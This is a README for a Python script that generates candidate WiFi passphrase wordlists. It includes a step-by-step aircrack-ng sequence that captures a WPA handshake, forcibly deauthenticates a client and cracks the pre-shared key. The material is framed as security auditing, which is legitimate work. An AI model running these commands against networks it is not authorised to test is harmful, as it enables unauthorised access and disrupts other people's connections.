# psk-passphrase-generator.py

## Description

Generate possible pre-shared key passphrase.

## Usage

Sample usage:

    ./psk-passphrase-generator.py -l 4 -p WIFI -o password.lst

Sample output:

    ...
    WIFI003Q
    WIFI003R
    WIFI003S
    WIFI003T
    WIFI003U
    WIFI003V
    WIFI003W
    WIFI003X
    WIFI003Y
    WIFI003Z
    ...

## Audit WiFi

Audit WiFi using [Aircrack](http://aircrack-ng.org) security auditing tools suite 

    # Setting up madwifi-ng
    airmon-ng start wifi0 9

    # Start airodump-ng to collect authentication handshake
    airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0

    # Use aireplay-ng to deauthenticate the wireless client (The lazy way)
    aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0

    # Use aireplay-ng to deauthenticate the wireless client (The aggressive way)
    aireplay-ng --deauth 5 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0

    # Run aircrack-ng to crack the pre-shared key
    aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap

## License

psk-passphrase-generator.py is licensed under the [MIT license](http://www.opensource.org/licenses/mit-license.php)